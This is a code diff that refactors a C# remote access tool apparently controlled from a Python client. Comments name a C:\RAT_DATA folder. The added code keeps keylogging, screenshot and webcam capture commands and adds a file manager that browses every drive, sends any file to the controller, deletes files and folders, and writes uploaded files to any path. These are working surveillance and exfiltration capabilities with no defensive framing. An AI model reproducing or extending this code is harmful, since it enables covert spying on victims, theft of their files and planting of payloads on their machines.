@@ -120,121 +120,34 @@ namespace ServerApp
             String s = "";
             while (true)
             {
-                receiveSignal(ref s); // Đọc 1 dòng từ Python
-
-                // Python gửi gì, C# bắt cái đó chính xác 1-1
+                receiveSignal(ref s);
                 switch (s)
                 {
-
+                    // --- NHÓM 1: CÁC MODULE CŨ ---
                     case "KEYLOG": keylog(); break;
                     case "PROCESS": process(); break;
                     case "APPLICATION": application(); break;
                     case "TAKEPIC": takepic(); break;
-                    case "SHUTDOWN": System.Diagnostics.Process.Start("ShutDown", "-s"); break;
-                    case "RESTART": System.Diagnostics.Process.Start("shutdown", "/r /t 0"); break;
+                    case "SHUTDOWN": Process.Start("ShutDown", "-s"); break;
+                    case "RESTART": Process.Start("shutdown", "/r /t 0"); break;
 
-                    // --- NHÓM LỆNH WEBCAM (MỞ RỘNG DỄ DÀNG) ---
-                    // Nếu sau này bạn muốn thêm tính năng "ZOOM", chỉ cần thêm case "WEBCAM_ZOOM"
-
+                    // --- NHÓM 2: WEBCAM (GOM VÀO 1 HÀM) ---
                     case "WEBCAM_START":
-                        isStreaming = true;
-                        StartWebcam();
-                        Program.nw.WriteLine("Webcam Started"); // Phản hồi cho Python
-                        Program.nw.Flush();
-                        break;
-
                     case "WEBCAM_STOP":
-                        isStreaming = false;
-                        isRecording = false;
-                        StopWebcam();
-                        Program.nw.WriteLine("Webcam Stopped"); // Phản hồi
-                        Program.nw.Flush();
-                        break;
-
                     case "WEBCAM_RECORD_ON":
-                        StartRecording();
-                        Program.nw.WriteLine("Recording Started"); // Phản hồi
-                        Program.nw.Flush();
-                        break;
-
                     case "WEBCAM_RECORD_OFF":
-                        // 1. Ngắt cờ ghi hình trước
-                        isRecording = false;
-
-                        // 2. QUAN TRỌNG: Tạm dừng 100ms để luồng Camera (video_NewFrame) kịp nhả file ra
-                        // Nếu không có dòng này, lệnh Close() bên dưới sẽ đụng độ với lệnh Write() đang chạy dở -> Sập
-                        Thread.Sleep(100);
-
-                        // 3. Đóng và Hủy biến writer an toàn
-                        if (writer != null)
-                        {
-                            try
-                            {
-                                // Dù writer đang mở hay đóng cũng cố gắng Dispose sạch sẽ
-                                writer.Close();
-                                writer.Dispose();
-                            }
-                            catch { }
-
-                            // 4. BẮT BUỘC: Gán về null để hàm StartRecording lần sau biết đường tạo mới
-                            // Nếu thiếu dòng này, lần quay sau sẽ báo lỗi "Cannot access a disposed object"
-                            writer = null;
-                        }
-
-                        Program.nw.WriteLine("Recording Saved");
-                        Program.nw.Flush(); // Đảm bảo gửi tin nhắn về Python ngay
+                        WebcamHandler(s); // Truyền lệnh con vào xử lý
                         break;
 
+                    // --- NHÓM 3: FILE MANAGER (GOM VÀO 1 HÀM) ---
                     case "GET_FILES":
-                        try
-                        {
-                            // Lấy danh sách file trong C:\RAT_DATA
-                            string[] files = Directory.GetFiles(dataFolder);
-
-                            // Gửi số lượng file trước
-                            Program.nw.WriteLine(files.Length.ToString());
-                            Program.nw.Flush();
-
-                            // Gửi tên và kích thước từng file
-                            foreach (string filePath in files)
-                            {
-                                FileInfo fi = new FileInfo(filePath);
-                                Program.nw.WriteLine(Path.GetFileName(filePath));
-                                Program.nw.Flush();
-                                Program.nw.WriteLine(fi.Length.ToString());
-                                Program.nw.Flush();
-                            }
-                        }
-                        catch { Program.nw.WriteLine("0"); Program.nw.Flush(); }
-                        break;
-
+                    case "DELETE_FILE":
+                    case "UPLOAD_FILE":
                     case "DOWNLOAD_FILE":
-                        try
-                        {
-                            // Nhận tên file cần tải
-                            string fileName = Program.nr.ReadLine();
-                            string fullPath = Path.Combine(dataFolder, fileName);
-
-                            if (File.Exists(fullPath))
-                            {
-                                FileInfo fi = new FileInfo(fullPath);
-                                Program.nw.WriteLine(fi.Length.ToString()); // Gửi kích thước
-                                Program.nw.Flush();
-                                Program.client.SendFile(fullPath);          // Gửi dữ liệu
-                            }
-                            else
-                            {
-                                Program.nw.WriteLine("0");
-                                Program.nw.Flush();
-                            }
-                        }
-                        catch { Program.nw.WriteLine("0"); Program.nw.Flush(); }
+                        FileHandler(s); // Truyền lệnh con vào xử lý
                         break;
-                    // --- THOÁT ---
-                    case "QUIT": return;
 
-                    // Default để tránh treo nếu nhận lệnh rác
-                    default: break;
+                    case "QUIT": return;
                 }
             }
         }
@@ -592,6 +505,160 @@ namespace ServerApp
             foreach (ImageCodecInfo codec in codecs)
                 if (codec.MimeType == mimeType) return codec;
             return null;
+        }
+
+        // 7. MODULE: Xử lý Webcam & Quay phim
+        private void WebcamHandler(string command)
+        {
+            switch (command)
+            {
+                case "WEBCAM_START":
+                    isStreaming = true;
+                    StartWebcam();
+                    Program.nw.WriteLine("Webcam Started");
+                    break;
+
+                case "WEBCAM_STOP":
+                    isStreaming = false;
+                    isRecording = false;
+                    StopWebcam();
+                    Program.nw.WriteLine("Webcam Stopped");
+                    break;
+
+                case "WEBCAM_RECORD_ON":
+                    StartRecording();
+                    Program.nw.WriteLine("Recording Started");
+                    break;
+
+                case "WEBCAM_RECORD_OFF":
+                    isRecording = false;
+                    Thread.Sleep(100); // Đợi luồng ghi nhả file
+
+                    if (writer != null)
+                    {
+                        try { writer.Close(); writer.Dispose(); } catch { }
+                        writer = null; // Reset
+                    }
+
+                    Program.nw.WriteLine("Recording Saved");
+                    break;
+            }
+            Program.nw.Flush();
+        }
+        // MODULE: Quản lý File (File Explorer)
+        private void FileHandler(string command)
+        {
+            try
+            {
+                switch (command)
+                {
+                    // 1. LẤY DANH SÁCH FILE/THƯ MỤC
+                    case "GET_FILES":
+                        string path = Program.nr.ReadLine();
+                        List<string> items = new List<string>();
+
+                        if (string.IsNullOrEmpty(path) || path == "ROOT")
+                        {
+                            DriveInfo[] drives = DriveInfo.GetDrives();
+                            foreach (DriveInfo d in drives)
+                                if (d.IsReady) items.Add($"[DRIVE]|{d.Name}|{d.TotalSize}");
+                        }
+                        else if (Directory.Exists(path))
+                        {
+                            string[] dirs = Directory.GetDirectories(path);
+                            foreach (string d in dirs) items.Add($"[FOLDER]|{Path.GetFileName(d)}|0");
+
+                            string[] files = Directory.GetFiles(path);
+                            foreach (string f in files)
+                            {
+                                FileInfo fi = new FileInfo(f);
+                                items.Add($"[FILE]|{Path.GetFileName(f)}|{fi.Length}");
+                            }
+                        }
+
+                        Program.nw.WriteLine(items.Count.ToString());
+                        Program.nw.Flush();
+                        foreach (string item in items) { Program.nw.WriteLine(item); Program.nw.Flush(); }
+                        break;
+
+                    // 2. XÓA FILE
+                    case "DELETE_FILE":
+                        string targetPath = Program.nr.ReadLine();
+                        if (File.Exists(targetPath))
+                        {
+                            File.Delete(targetPath);
+                            Program.nw.WriteLine("Đã xóa file.");
+                        }
+                        else if (Directory.Exists(targetPath))
+                        {
+                            Directory.Delete(targetPath, true);
+                            Program.nw.WriteLine("Đã xóa thư mục.");
+                        }
+                        else Program.nw.WriteLine("Đường dẫn không tồn tại.");
+                        break;
+
+                    // 3. TẢI FILE VỀ MÁY (DOWNLOAD)
+                    case "DOWNLOAD_FILE":
+                        string downPath = Program.nr.ReadLine();
+                        if (File.Exists(downPath))
+                        {
+                            FileInfo fi = new FileInfo(downPath);
+                            Program.nw.WriteLine(fi.Length.ToString());
+                            Program.nw.Flush();
+                            Program.client.SendFile(downPath);
+                        }
+                        else Program.nw.WriteLine("0");
+                        break;
+
+                    // 4. UPLOAD FILE LÊN SERVER (CHUNKING)
+                    case "UPLOAD_FILE":
+                        string savePath = "";
+                        // Vét sạch dòng trống (Ghost Newlines)
+                        while (string.IsNullOrWhiteSpace(savePath))
+                        {
+                            if (Program.nr.Peek() == -1) break;
+                            savePath = Program.nr.ReadLine();
+                        }
+                        string sizeStr = Program.nr.ReadLine();
+
+                        long dataSize;
+                        if (!string.IsNullOrEmpty(savePath) && long.TryParse(sizeStr, out dataSize))
+                        {
+                            StringBuilder b64Builder = new StringBuilder((int)dataSize);
+                            char[] buffer = new char[4096];
+                            long totalRead = 0;
+
+                            while (totalRead < dataSize)
+                            {
+                                int toRead = (int)Math.Min(buffer.Length, dataSize - totalRead);
+                                int read = Program.nr.Read(buffer, 0, toRead);
+                                if (read == 0) break;
+                                b64Builder.Append(buffer, 0, read);
+                                totalRead += read;
+                            }
+
+                            if (totalRead >= dataSize)
+                            {
+                                try
+                                {
+                                    byte[] fileBytes = Convert.FromBase64String(b64Builder.ToString());
+                                    File.WriteAllBytes(savePath, fileBytes);
+                                    Program.nw.WriteLine("Upload thành công!");
+                                }
+                                catch { Program.nw.WriteLine("Lỗi: File hỏng."); }
+                            }
+                            else Program.nw.WriteLine($"Lỗi: Mới nhận {totalRead}/{dataSize} bytes.");
+                        }
+                        else Program.nw.WriteLine("Lỗi: Header sai.");
+                        break;
+                }
+            }
+            catch (Exception ex)
+            {
+                // Gửi thông báo lỗi chung nếu có ngoại lệ
+                Program.nw.WriteLine("Lỗi Server: " + ex.Message);
+            }
+            Program.nw.Flush();
         }
     }
 }
